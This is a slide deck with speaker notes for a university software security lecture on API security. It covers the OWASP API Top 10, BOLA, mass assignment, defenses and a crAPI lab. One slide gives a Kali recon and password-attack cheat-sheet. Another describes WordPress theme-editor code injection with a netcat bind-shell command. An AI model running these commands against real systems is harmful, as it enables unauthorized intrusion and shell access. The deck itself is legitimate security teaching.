---
marp: true
theme: default
paginate: true
header: "Software Security · Week 10"
---

# Week 10
## API Security
Software Security · Nutthakorn Chalaemwongwan

<!-- Welcome back after midterm. Hook: change one number in an API URL and read a stranger's car location — that's the #1 API bug, and it's everywhere. Today: the OWASP API Top 10, hands-on. ~2 min. -->

---

## Today

- REST/GraphQL attack surface
- OWASP **API Security Top 10**
- BOLA & mass assignment
- Rate limiting & resource consumption
- 🎮 Game: **crAPI Raid**

<!-- Roadmap, 1 min. Frame: APIs are where the web bugs (IDOR, injection) reappear without a browser to hide behind. Lab = raid the deliberately vulnerable crAPI app, then fix it. -->

---

## Recap — Web half

- Injection, XSS, auth/IDOR
- APIs concentrate all of these — and add their own

<!-- 1-min bridge from the web unit. The midterm tested W1-6; APIs reuse all of it. Ask: "what was IDOR?" — because BOLA (the #1 API risk) is literally IDOR at API scale. -->

---

## Why APIs are different

- Machine-to-machine, no browser to "protect" them
- Object IDs everywhere → ripe for IDOR/BOLA
- Clients can send any field → mass assignment
- Maps to the **OWASP API Security Top 10**

<!-- Key framing. No browser = no SameSite/CSP safety net; the API is the raw attack surface. APIs expose object ids by design (REST). Mobile/SPA clients are fully attacker-controlled — never trust what they send. ~5 min. -->

---

## BOLA (API1) — the #1 API risk

```text
GET /api/vehicle/1001/location   → yours
GET /api/vehicle/1002/location   → someone else's
```

- Broken Object Level Authorization
- = IDOR, at API scale

<!-- The worked example — this is the crAPI BOLA challenge. Same root cause as W6 IDOR: authenticated, but no per-object ownership check. Ask: "the server knows who I am — why does it still leak 1002?" (it never checks the object belongs to me). ~6 min. -->

---

## Mass assignment (API3)

```json
POST /api/user  { "name":"x", "role":"admin", "credit":9999 }
```

- Client sets fields the server blindly binds
- Privilege/credit escalation

<!-- Walk it: the server takes the JSON and binds every field to the model, including ones the UI never exposes (role, credit, is_verified). This is the crAPI mass-assignment challenge and the weekly quiz Q6. Fix = allow-list the bindable fields. ~5 min. -->

---

## More of the Top 10

- API2 — broken authentication
- API4 — unrestricted resource consumption (no rate limit)
- API6 — unrestricted access to sensitive business flows
- Excessive data exposure (over-returning fields)

<!-- Round out the list. API4 = no rate limit → brute force / cost blowup. Excessive data exposure = API returns the whole user object and the UI just hides fields — attacker reads the raw JSON. ~4 min. -->

---

## Defenses

- **Object-level authorization** on every request (check ownership)
- **Allow-list** request schemas — bind only intended fields
- Rate limiting / quotas
- Return only needed fields (DTOs)
- Schema validation (OpenAPI / GraphQL types)

<!-- The payoff. #1: ownership check on every object access (kills BOLA). DTO/allow-list binding kills mass assignment AND excessive exposure in one move. Schema validation at the edge rejects junk early. ~5 min. -->

---

## Complementary: black-box recon cheat-sheet

When you only have an IP/URL (Kali):

```bash
netdiscover                 # find hosts
nmap -sV target             # ports/services (80/443?)
nikto -h http://target      # web server issues
dirb  http://target         # hidden paths
wpscan --url http://target  # if WordPress
hydra ... http-post-form    # password attack
```

<!-- Practical recon for the CTF/midterm-style tasks: enumerate before you exploit. Emphasize ethics + scope: only against provided sandbox targets. This is the "map the attack surface" muscle from W1, applied live. ~4 min. -->

---

## Real-world: feature abused as backdoor

WordPress 404-template RCE → bind shell:

```text
Appearance → Theme Editor → 404 Template → insert exec(...)
# trigger by visiting any non-existent page
nc -lvp 34567 -e /bin/bash   # attacker gets a shell
```

> Legitimate admin features become RCE without strict authz + integrity checks.

<!-- Shows that "a feature" + missing authz = RCE. A legit admin editor, abused once an attacker has access. Ties to least-privilege: even admins shouldn't be able to inject executable code. ~3 min. -->

---

## 🥷 Game — crAPI Raid

```bash
git clone https://github.com/OWASP/crAPI.git
cd crAPI/deploy/docker && docker compose up -d
```

1. **BOLA:** read another user's vehicle/order
2. **Mass assignment:** set a forbidden field
3. **Resource consumption:** hit an unthrottled endpoint
4. **Round 2:** add authz + schema validation + rate limiting

<!-- Explain before lab. crAPI is OWASP's intentionally vulnerable API. Round 2 (fix) is graded. Note crAPI is heavier (compose stack) — start the pull early. Q6 of the quiz asks for the mass-assignment field + fix + flag. ~3 min. -->

---

## Deliverable

> 📋 **Worksheet 10** — `labs/week10-api-security/worksheet.md` (Part 3) · **kickoff:** `docker compose up` → :8080 (insecure) / :8081 (secure)

- Findings mapped to the API Top 10
- Fixes (authz checks, schemas, limits)
- Proof exploits now fail
- **+ Audit the AI / EiPE / Prompt Problem** (see worksheet)

<!-- Before/after + API-Top-10 mapping. AI-resilient tasks count. Also the NoteVault project API task. -->

---

## Key takeaways

- BOLA/IDOR is the dominant API bug — check ownership
- Bind only fields you intend
- Validate and throttle everything

<!-- Recap. Cold-call: "what one check stops BOLA?" (per-object ownership authorization). ~2 min. -->

---

# Questions?
Next week: Memory-safety & exploitation

<!-- Cliffhanger: "Next week we leave the web — crash a C binary with a fuzzer and hijack its execution, then rewrite it in Rust." Remind crAPI pulled before next session. -->
